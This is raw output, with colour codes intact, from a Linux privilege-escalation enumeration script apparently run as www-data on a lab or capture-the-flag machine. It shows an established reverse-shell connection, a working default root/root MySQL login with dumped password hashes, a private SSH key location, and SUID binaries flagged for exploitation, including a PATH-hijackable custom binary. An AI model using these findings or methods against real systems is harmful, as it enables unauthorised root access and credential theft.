[1;33m[+] [1;32mAnalyzing .service files
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#services
[0m[1;32mYou can't write on systemd PATH[0m

[1;33m[+] [1;32mSystem timers
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
[0mNEXT                         LEFT     LAST                         PASSED       UNIT                         ACTIVATES
Sat 2021-04-03 19:04:15 PDT  9h left  Sat 2021-04-03 07:18:45 PDT  2h 14min ago [1;32mapt-daily.timer[0m              apt-daily.service
Sun 2021-04-04 06:02:59 PDT  20h left Sat 2021-04-03 07:18:45 PDT  2h 14min ago [1;32mapt-daily-upgrade.timer[0m      apt-daily-upgrade.service
Sun 2021-04-04 07:33:57 PDT  22h left Sat 2021-04-03 07:33:57 PDT  1h 59min ago [1;32msystemd-tmpfiles-clean.timer[0m systemd-tmpfiles-clean.service
n/a                          n/a      n/a                          n/a          [1;32mureadahead-stop.timer[0m        ureadahead-stop.service

[1;33m[+] [1;32mAnalyzing .timer files
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
[0m
[1;33m[+] [1;32mAnalyzing .socket files
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
[0m
[1;33m[+] [1;32mHTTP sockets
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
[0m
[1;33m[+] [1;32mD-Bus config files
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
[0m
[1;33m[+] [1;32mD-Bus Service Objects list
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
[0m[1;32mNAME[0m                               PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
[1;32m:1.0[0m                                 1 systemd         root             :1.0          init.scope                -          -                  
[1;32m:1.1[0m                               552 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
[1;32m:1.128[0m                            3009 busctl          www-data         :1.128        apache2.service           -          -                  
[1;32m:1.2[0m                               586 accounts-daemon root             :1.2          accounts-daemon.service   -          -                  
[1;32mcom.ubuntu.LanguageSelector[0m          - -               -                (activatable) -                         -         
[1;32morg.freedesktop.Accounts[0m           586 accounts-daemon root             :1.2          accounts-daemon.service   -          -                  
[1;32morg.freedesktop.DBus[0m               556 dbus-daemon     messagebus       [1;32morg.freedesktop.DBus[0m dbus.service              -          -                  
[1;32morg.freedesktop.hostname1[0m            - -               -                (activatable) -                         -         
[1;32morg.freedesktop.locale1[0m              - -               -                (activatable) -                         -         
[1;32morg.freedesktop.login1[0m             552 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
[1;32morg.freedesktop.network1[0m             - -               -                (activatable) -                         -         
[1;32morg.freedesktop.resolve1[0m             - -               -                (activatable) -                         -         
[1;32morg.freedesktop.systemd1[0m             1 systemd         root             :1.0          init.scope                -          -                  
[1;32morg.freedesktop.timedate1[0m            - -               -                (activatable) -                         -         


[1;34m===================================( [1;32mNetwork Information[1;34m )====================================
[0m[1;33m[+] [1;32mHostname, hosts and DNS
[0mubuntu
127.0.0.1	localhost
127.0.1.1	ubuntu

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 10.0.0.2
search eu-west-1.compute.internal

[1;33m[+] [1;32mContent of /etc/inetd.conf & /etc/xinetd.conf
[0m[1;90m/etc/inetd.conf Not Found
[0m
[1;33m[+] [1;32mInterfaces
[0m# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0      Link encap:Ethernet  HWaddr 02:63:49:6d:32:df  
          inet addr:10.10.86.202  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::63:49ff:fe6d:32df/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:205000 errors:0 dropped:0 overruns:0 frame:0
          TX packets:162636 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:17710316 (17.7 MB)  TX bytes:32293437 (32.2 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:400 errors:0 dropped:0 overruns:0 frame:0
          TX packets:400 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:35600 (35.6 KB)  TX bytes:35600 (35.6 KB)


[1;33m[+] [1;32mNetworks and neighbours
[0mKernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         ip-10-10-0-1.eu 0.0.0.0         UG    0      0        0 eth0
10.10.0.0       *               255.255.0.0     U     0      0        0 eth0
Address                  HWtype  HWaddress           Flags Mask            Iface
ip-10-10-0-1.eu-west-1.  ether   02:c8:85:b5:5a:aa   C                     eth0

[1;33m[+] [1;32mIptables rules
[0m[1;90miptables rules Not Found
[0m
[1;33m[+] [1;32mActive Ports
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
[0mActive Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 [1;31m127.0.0.1[0m:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0   1288 10.10.86.202:45076      10.9.3.85:9999          ESTABLISHED 1078/bash       
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       1      0 10.10.86.202:80         10.9.3.85:47036         CLOSE_WAIT  -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               

[1;33m[+] [1;32mCan I sniff with tcpdump?
[0m[1;90mNo
[0m

[1;34m====================================( [1;32mUsers Information[1;34m )=====================================
[0m[1;33m[+] [1;32mMy user
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#users
[0muid=33([1;95m[1;34m[1;32mwww-data[0m[0m[0m) gid=33([1;95m[1;34m[1;32mwww-data[0m[0m[0m) groups=33([1;95m[1;34m[1;32mwww-data[0m[0m[0m)

[1;33m[+] [1;32mDo I have PGP keys?
[0m/usr/bin/gpg
[1;90mnetpgpkeys Not Found
[0m[1;90mnetpgp Not Found
[0m
[1;33m[+] [1;32mClipboard or highlighted text?
[0m[1;90mxsel and xclip Not Found
[0m
[1;33m[+] [1;32mChecking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
[0m
[1;33m[+] [1;32mChecking sudo tokens
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
[0m/proc/sys/kernel/yama/ptrace_scope [1;32mis not enabled[0m (1)
[1;31mgdb was found in PATH[0m

[1;33m[+] [1;32mChecking doas.conf
[0m[1;90m/etc/doas.conf Not Found
[0m
[1;33m[+] [1;32mChecking Pkexec policy
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2
[0m
[1;33m[+] [1;32mSuperusers
[0m[1;31mroot[0m:x:0:0:root:/root:/bin/bash

[1;33m[+] [1;32mUsers with console
[0m[1;96mpapa[0m:x:1000:1000:qaa:/home/papa:/bin/bash
[1;96mpingu[0m:x:1002:1002::/home/pingu:/bin/bash
[1;31mroot[0m:x:0:0:root:/root:/bin/bash

[1;33m[+] [1;32mAll users & groups
[0muid=0[1;31m([1;31mroot[0m)[0m gid=0[1;31m(root)[0m groups=0[1;31m(root)[0m
uid=1([1;34m[1;32mdaemon[0m[0m) gid=1([1;34m[1;32mdaemon[0m[0m) groups=1([1;34m[1;32mdaemon[0m[0m)
uid=10([1;34muucp[0m) gid=10([1;34muucp[0m) groups=10([1;34muucp[0m)
uid=100([1;34msystemd-timesync[0m) gid=102([1;34msystemd-timesync[0m) groups=102([1;34msystemd-timesync[0m)
uid=1000([1;96mpapa[0m) gid=1000([1;96mpapa[0m) groups=1000([1;96mpapa[0m),4[1;31m(adm)[0m,24[1;32m(cdrom)[0m,27[1;31m(sudo)[0m,30(dip),46[1;32m(plugdev)[0m,114([1;34mlp[0madmin),115(sambashare)
uid=1002([1;96mpingu[0m) gid=1002([1;96mpingu[0m) groups=1002([1;96mpingu[0m),4[1;31m(adm)[0m,24[1;32m(cdrom)[0m,27[1;31m(sudo)[0m,30(dip)
uid=101([1;34msystemd-network[0m) gid=103([1;34msystemd-network[0m) groups=103([1;34msystemd-network[0m)
uid=102([1;34msystemd-resolve[0m) gid=104([1;34msystemd-resolve[0m) groups=104([1;34msystemd-resolve[0m)
uid=103([1;34msystemd-bus-proxy[0m) gid=105([1;34msystemd-bus-proxy[0m) groups=105([1;34msystemd-bus-proxy[0m)
uid=104([1;34m[1;32msyslog[0m[0m) gid=108([1;34m[1;32msyslog[0m[0m) groups=108([1;34m[1;32msyslog[0m[0m),4[1;31m(adm)[0m
uid=105([1;34m_apt[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=106([1;34mmessagebus[0m) gid=110([1;34mmessagebus[0m) groups=110([1;34mmessagebus[0m)
uid=107([1;34muuidd[0m) gid=111([1;34muuidd[0m) groups=111([1;34muuidd[0m)
uid=108([1;34mmysql[0m) gid=116([1;34mmysql[0m) groups=116([1;34mmysql[0m)
uid=109([1;34msshd[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=13([1;34mproxy[0m) gid=13([1;34mproxy[0m) groups=13([1;34mproxy[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3([1;34msys[0m) gid=3([1;34msys[0m) groups=3([1;34msys[0m)
uid=33([1;95m[1;34m[1;32mwww-data[0m[0m[0m) gid=33([1;95m[1;34m[1;32mwww-data[0m[0m[0m) groups=33([1;95m[1;34m[1;32mwww-data[0m[0m[0m)
uid=34([1;34mbackup[0m) gid=34([1;34mbackup[0m) groups=34([1;34mbackup[0m)
uid=38([1;34mlist[0m) gid=38([1;34mlist[0m) groups=38([1;34mlist[0m)
uid=39([1;34mirc[0m) gid=39([1;34mirc[0m) groups=39([1;34mirc[0m)
uid=4([1;34msync[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=41([1;34mgnats[0m) gid=41([1;34mgnats[0m) groups=41([1;34mgnats[0m)
uid=5([1;34mgames[0m) gid=60([1;34mgames[0m) groups=60([1;34mgames[0m)
uid=6([1;34mman[0m) gid=12([1;34mman[0m) groups=12([1;34mman[0m)
uid=65534([1;34mnobody[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=7([1;34mlp[0m) gid=7([1;34mlp[0m) groups=7([1;34mlp[0m)
uid=8([1;34m[1;32mmail[0m[0m) gid=8([1;34m[1;32mmail[0m[0m) groups=8([1;34m[1;32mmail[0m[0m)
uid=9([1;34mnews[0m) gid=9([1;34mnews[0m) groups=9([1;34mnews[0m)

[1;33m[+] [1;32mLogin now
[0m 09:33:38 up  2:15,  0 users,  load average: 0.07, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

[1;33m[+] [1;32mLast logons
[0m[1;96mpingu[0m    pts/0        Thu Jan 16 20:18:26 2020 - crash                     (00:33)     192.168.124.1
[1;96mpapa[0m     tty1         Thu Jan 16 20:15:17 2020 - crash                     (00:36)     0.0.0.0
reboot   [1;31msys[0mtem boot  Thu Jan 16 20:15:06 2020 - Thu Jan 16 20:55:25 2020  (00:40)     0.0.0.0
[1;31mroot[0m     pts/0        Wed Jan 15 21:43:47 2020 - crash                     (22:31)     0.0.0.0
[1;31mroot[0m     tty1         Wed Jan 15 21:36:17 2020 - crash                     (22:38)     0.0.0.0
[1;96mpingu[0m    pts/0        Wed Jan 15 21:22:50 2020 - Wed Jan 15 21:38:05 2020  (00:15)     192.168.124.1
[1;96mpapa[0m     tty1         Wed Jan 15 17:59:16 2020 - Wed Jan 15 21:36:09 2020  (03:36)     0.0.0.0
reboot   [1;31msys[0mtem boot  Wed Jan 15 17:57:24 2020 - Thu Jan 16 20:55:25 2020 (1+02:58)    0.0.0.0

wtmp begins Wed Jan 15 17:57:24 2020

[1;33m[+] [1;32mLast time logon each user
[0mUsername         Port     From             Latest
[1;31mroot[0m             tty1                      Thu Jan 16 21:09:47 -0800 2020
[1;96mpapa[0m             tty1                      Thu Jan 16 20:15:17 -0800 2020
[1;96mpingu[0m            tty1                      Mon Jan 20 14:14:47 -0800 2020

[1;33m[+] [1;32mPassword policy
[0mPASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512

[1;33m[+] [1;32mDo not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[0m[1;33m[+] [1;32mDo not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
[0m

[1;34m===================================( [1;32mSoftware Information[1;34m )===================================
[0m[1;33m[+] [1;32mMySQL version
[0mmysql  Ver 14.14 Distrib 5.7.28, for Linux (x86_64) using  EditLine wrapper

[1;33m[+] [1;32mMySQL connection using default root/root ........... [0m[1;31mYes[0m
[1;31mUser	Host	authentication_string[0m
[1;31mroot	localhost	*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B[0m
[1;31mmysql.session	localhost	*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE[0m
[1;31mmysql.sys	localhost	*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE[0m
[1;31mdebian-sys-maint	localhost	*82D1BDA2F1E16E0DAEE2412F1C6E8DE7DF8B84FD[0m
[1;33m[+] [1;32mMySQL connection using root/toor ................... [0m[1;90mNo
[0m[1;33m[+] [1;32mMySQL connection using root/NOPASS ................. [0m[1;90mNo
[0m[1;33m[+] [1;32mSearching mysql credentials and exec
[0m[1;90m Not Found
[0m
[1;33m[+] [1;32mPostgreSQL version and pgadmin credentials
[0m[1;90m Not Found
[0m
[1;33m[+] [1;32mPostgreSQL connection to template0 using postgres/NOPASS ........ [0m[1;90mNo
[0m[1;33m[+] [1;32mPostgreSQL connection to template1 using postgres/NOPASS ........ [0m[1;90mNo
[0m[1;33m[+] [1;32mPostgreSQL connection to template0 using pgsql/NOPASS ........... [0m[1;90mNo
[0m[1;33m[+] [1;32mPostgreSQL connection to template1 using pgsql/NOPASS ........... [0m[1;90mNo
[0m
[1;33m[+] [1;32mApache server info
[0mVersion: Server version: Apache/2.4.18 (Ubuntu)
Server built:   2019-10-08T13:31:25
PHP exec extensions
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php-source

[1;33m[+] [1;32mSearching PHPCookies
[0m[1;90m Not Found
[0m
[1;33m[+] [1;32mSearching Wordpress wp-config.php files
[0m[1;90mwp-config.php Not Found
[0m
[1;33m[+] [1;32mSearching Drupal settings.php files
[0m[1;90m/default/settings.php Not Found
[0m
[1;33m[+] [1;32mSearching Tomcat users file
[0m[1;90mtomcat-users.xml Not Found
[0m
[1;33m[+] [1;32mMongo information
[0m[1;90mmongo binary Not Found
[0m
[1;33m[+] [1;32mSearching supervisord configuration file
[0m[1;90msupervisord.conf Not Found
[0m
[1;33m[+] [1;32mSearching cesi configuration file
[0m[1;90mcesi.conf Not Found
[0m
[1;33m[+] [1;32mSearching Rsyncd config file
[0m[1;90mrsyncd.conf Not Found
[0m[1;33m[+] [1;32mSearching Hostapd config file
[0m[1;90mhostapd.conf Not Found
[0m
[1;33m[+] [1;32mSearching wifi conns file
[0m[1;90m Not Found
[0m
[1;33m[+] [1;32mSearching Anaconda-ks config files
[0m[1;90manaconda-ks.cfg Not Found
[0m
[1;33m[+] [1;32mSearching .vnc directories and their passwd files
[0m[1;90m.vnc Not Found
[0m
[1;33m[+] [1;32mSearching ldap directories and their hashes
[0m[1;90mldap Not Found
[0m
[1;33m[+] [1;32mSearching .ovpn files and credentials
[0m[1;90m.ovpn Not Found
[0m
[1;33m[+] [1;32mSearching ssl/ssh files
[0mPort 22
PermitRootLogin prohibit-password
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
[1;31mPossible private SSH keys were found![0m
[1;31m/home/pingu/.ssh/id_rsa[0m
 --> /etc/hosts.allow file found, read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
[1;31mHost[0m *
    SendEnv LANG LC_*
    HashKnown[1;31mHost[0ms yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

[1;33m[+] [1;32mSearching unexpected auth lines in /etc/pam.d/sshd
[0m[1;90mNo
[0m
[1;33m[+] [1;32mSearching Cloud credentials (AWS, Azure, GC)
[0m
[1;33m[+] [1;32mNFS exports?
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
[0m[1;90m/etc/exports Not Found
[0m
[1;33m[+] [1;32mSearching kerberos conf files and tickets
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
[0m[1;90mkrb5.conf Not Found
[0m[1;90mtickets kerberos Not Found
[0m[1;90mklist Not Found
[0m
[1;33m[+] [1;32mSearching Kibana yaml
[0m[1;90mkibana.yml Not Found
[0m
[1;33m[+] [1;32mSearching Knock configuration
[0m[1;90mKnock.config Not Found
[0m
[1;33m[+] [1;32mSearching logstash files
[0m[1;90m Not Found
[0m
[1;33m[+] [1;32mSearching elasticsearch files
[0m[1;90m Not Found
[0m
[1;33m[+] [1;32mSearching Vault-ssh files
[0m[1;90mvault-ssh-helper.hcl Not Found
[0m
[1;33m[+] [1;32mSearching AD cached hashes
[0m[1;90mcached hashes Not Found
[0m
[1;33m[+] [1;32mSearching screen sessions
[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
[0m[1;90mscreen Not Found
[0m
[1;33m[+] [1;32mSearching tmux sessions
[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
[0m[1;90mtmux Not Found
[0m
[1;33m[+] [1;32mSearching Couchdb directory
[0m
[1;33m[+] [1;32mSearching redis.conf
[0m
[1;33m[+] [1;32mSearching dovecot files
[0m[1;90mdovecot credentials Not Found
[0m
[1;33m[+] [1;32mSearching mosquitto.conf
[0m
[1;33m[+] [1;32mSearching neo4j auth file
[0m
[1;33m[+] [1;32mSearching Cloud-Init conf file
[0m
[1;33m[+] [1;32mSearching Erlang cookie file
[0m
[1;33m[+] [1;32mSearching GVM auth file
[0m
[1;33m[+] [1;32mSearching IPSEC files
[0m
[1;33m[+] [1;32mSearching IRSSI files
[0m
[1;33m[+] [1;32mSearching Keyring files
[0m
[1;33m[+] [1;32mSearching Filezilla sites file
[0m
[1;33m[+] [1;32mSearching backup-manager files
[0m
[1;33m[+] [1;32mSearching uncommon passwd files (splunk)
[0m
[1;33m[+] [1;32mSearching GitLab related files
[0m

[1;33m[+] [1;32mSearching PGP/GPG
[0mPGP/GPG software:
/usr/bin/gpg
[1;90mnetpgpkeys Not Found
[0m[1;90mnetpgp Not Found
[0m
[1;33m[+] [1;32mSearching vim files
[0m
[1;33m[+] [1;32mChecking if containerd(ctr) is available
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation
[0m
[1;33m[+] [1;32mChecking if runc is available
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation
[0m
[1;33m[+] [1;32mSearching docker files
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket
[0mls: cannot access '': No such file or directory

[1;33m[+] [1;32mInteresting Firefox Files
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox
[0m
[1;33m[+] [1;32mInteresting Chrome Files
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox
[0m

[1;34m====================================( [1;32mInteresting Files[1;34m )=====================================
[0m[1;33m[+] [1;32mSUID - Check easy privesc, exploits and write perms
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
[0m-rwsr-xr-x 1 root root        44K May  7  2014 /bin[1;32m/ping6[0m
-rwsr-xr-x 1 root root        44K May  7  2014 /bin[1;32m/ping[0m
-rwsr-xr-x 1 root root        31K Jul 12  2016 /bin[1;32m/fusermount[0m
-rwsr-xr-- 1 root messagebus  42K Jan 12  2017 /usr/lib/dbus-1.0[1;32m/dbus-daemon-launch-helper[0m
-rwsr-xr-x 1 root root       139K Jan 28  2017 /bin[1;31m/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)[0m
-rwsr-xr-x 1 root root        10K Mar 27  2017 /usr/lib/eject[1;32m/dmcrypt-get-device[0m
-rwsr-xr-x 1 root root        40K May 16  2017 /usr/bin[1;32m/chsh[0m
-rwsr-xr-x 1 root root        53K May 16  2017 /usr/bin[1;31m/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)[0m
-rwsr-xr-x 1 root root        74K May 16  2017 /usr/bin[1;32m/gpasswd[0m
-rwsr-xr-x 1 root root        49K May 16  2017 /usr/bin[1;31m/chfn  --->  SuSE_9.3/10[0m
-rwsr-xr-x 1 root root        39K May 16  2017 /usr/bin[1;31m/newgrp  --->  HP-UX_10.20[0m
-rwsr-xr-x 1 root root        40K May 16  2017 /bin[1;32m/su[0m
-rwsr-xr-x 1 root root       134K Jul  4  2017 /usr/bin[1;31m/sudo  --->  /sudo$[0m
-rwsr-xr-x 1 root root        11K May  8  2018 /usr/bin[1;32m/vmware-user-suid-wrapper[0m
-rwsr-xr-x 1 root root        27K May 16  2018 /bin[1;31m/umount  --->  BSD/Linux(08-1996)[0m
-rwsr-xr-x 1 root root        40K May 16  2018 /bin[1;31m/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8[0m
-rwsr-xr-x 1 root root       419K Mar  4  2019 /usr/lib/openssh[1;32m/ssh-keysign[0m
-r-sr-xr-x 1 root papa       7.4K Jan 16  2020 [1m/opt/secret/root[0m
[3m[3m  --- It looks like [1;31m/opt/secret/root[0m[3m is executing [1;31mcat[0m[3m and you can impersonate it (strings line: cat /var/backups/shadow.bak) (https://tinyurl.com/suidpath)
[3m  --- Trying to execute /opt/secret/root with strace in order to look for hijackable libraries...
[1;31maccess[0m[3m("/etc/suid-debug", F_OK)         = -1 ENOENT ([1;31mNo such file[0m[3m or directory)
[1;31maccess[0m[3m("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT ([1;31mNo such file[0m[3m or directory)
[1;31maccess[0m[3m("/etc/ld.so.preload", R_OK)      = -1 ENOENT ([1;31mNo such file[0m[3m or directory)
[1;31mopen[0m[3m("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
[1;31maccess[0m[3m("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT ([1;31mNo such file[0m[3m or directory)
[1;31mopen[0m[3m("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
[0m

[1;33m[+] [1;32mSGID
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
[0m-rwxr-sr-x 1 root mlocate  39K Nov 17  2014 /usr/bin[1;32m/mlocate[0m
-rwxr-sr-x 1 root tty      15K Mar  1  2016 /usr/bin[1;32m/bsd-write[0m
-rwxr-sr-x 1 root utmp     10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter[1;32m/utempter[0m
-rwxr-sr-x 1 root crontab  36K Apr  5  2016 /usr/bin[1;32m/crontab[0m
-rwxr-sr-x 1 root shadow   23K May 16  2017 /usr/bin[1;32m/expiry[0m
-rwxr-sr-x 1 root shadow   61K May 16  2017 /usr/bin[1;32m/chage[0m
-rwxr-sr-x 1 root shadow   35K Apr  9  2018 /sbin[1;32m/unix_chkpwd[0m
-rwxr-sr-x 1 root shadow   35K Apr  9  2018 /sbin[1;32m/pam_extrausers_chkpwd[0m
-rwxr-sr-x 1 root tty      27K May 16  2018 /usr/bin[1;32m/wall[0m
-rwxr-sr-x 1 root ssh     351K Mar  4  2019 /usr/bin[1;32m/ssh-agent[0m

[1;33m[+] [1;32mChecking misconfigurations of ld.so
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
[0m[3m/etc/ld.so.conf
[0minclude /etc/ld.so.conf.d/*.conf

[3m/etc/ld.so.conf.d
[0m[3m  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
[0m[1;32m/usr/lib/x86_64-linux-gnu/libfakeroot[0m
[3m  /etc/ld.so.conf.d/i386-linux-gnu.conf
[0m/lib/i386-linux-gnu
/usr/lib/i386-linux-gnu
/lib/i686-linux-gnu
/usr/lib/i686-linux-gnu
[3m  /etc/ld.so.conf.d/libc.conf
[0m[1;32m/usr/local/lib[0m
[3m  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
[0m[1;32m/lib/x86_64-linux-gnu[0m
[1;32m/usr/lib/x86_64-linux-gnu[0m
[3m  /etc/ld.so.conf.d/x86_64-linux-gnu_EGL.conf
[0m[1;32m/usr/lib/x86_64-linux-gnu[0m/mesa-egl
[3m  /etc/ld.so.conf.d/zz_i386-biarch-compat.conf
[0m[1;32m/lib32[0m
[1;32m/usr/lib32[0m
[3m  /etc/ld.so.conf.d/zz_x32-biarch-compat.conf
[0m/libx32
/usr/libx32

[1;33m[+] [1;32mCapabilities
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
[0mCurrent capabilities:
Current: =
[1;32mCapInh:	0000000000000000[0m
[1;32mCapPrm:	0000000000000000[0m
[1;32mCapEff:	0000000000000000[0m
[1;32mCapBnd:	0000003fffffffff[0m
[1;32mCapAmb:	0000000000000000[0m

Shell capabilities:
0x0000000000000000=
[1;32mCapInh:	0000000000000000[0m
[1;32mCapPrm:	0000000000000000[0m
[1;32mCapEff:	0000000000000000[0m
[1;32mCapBnd:	0000003fffffffff[0m
[1;32mCapAmb:	0000000000000000[0m

Files with capabilities:
/usr/bin[1;31m/mtr[0m = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = [1;31mcap_dac_override[0m,cap_sys_ptrace+ep

[1;33m[+] [1;32mUsers with capabilities
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
[0m[1;90m/etc/security/capability.conf Not Found
[0m
[1;33m[+] [1;32mFiles with ACLs
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
[0m[1;90mfiles with acls in searched folders Not Found
[0m
[1;33m[+] [1;32m.sh files in path
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
[0m/usr/bin[1;32m/gettext.sh[0m

[1;33m[+] [1;32mUnexpected in root
[0m[1;31m/libx32[0m
[1;31m/lost+found[0m
[1;31m/lib32[0m
[1;31m/initrd.img[0m
[1;31m/vmlinuz[0m

[1;33m[+] [1;32mFiles (scripts) in /etc/profile.d/
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files
[0mtotal 16
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rw-r--r--  1 root root  663 May 18  2016 [1;32mbash_completion.sh[0m
-rw-r--r--  1 root root 1003 Dec 29  2015 [1;32mcedilla-portuguese.sh[0m

[1;33m[+] [1;32mPermissions in init, init.d, systemd, and rc.d
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
[0m
[1;33m[+] [1;32mHashes inside passwd file? ........... [0m[1;90mNo
[0m[1;33m[+] [1;32mWritable passwd file? ................ [0m[1;90mNo
[0m[1;33m[+] [1;32mCredentials in fstab/mtab? ........... [0m[1;90mNo
[0m[1;33m[+] [1;32mCan I read shadow files? ............. [0m[1;90mNo
[0m[1;33m[+] [1;32mCan I read opasswd file? ............. [0m[1;90mNo
[0m[1;33m[+] [1;32mCan I write in network-scripts? ...... [0m[1;90mNo
[0m[1;33m[+] [1;32mCan I read root folder? .............. [0m[1;90mNo
[0m
[1;33m[+] [1;32mSearching root files in home dirs (limit 30)
[0m/home/
/home/[1;96mpingu[0m/.gdbinit
/root/

[1;33m[+] [1;32mSearching folders owned by me containing others files on it
[0m
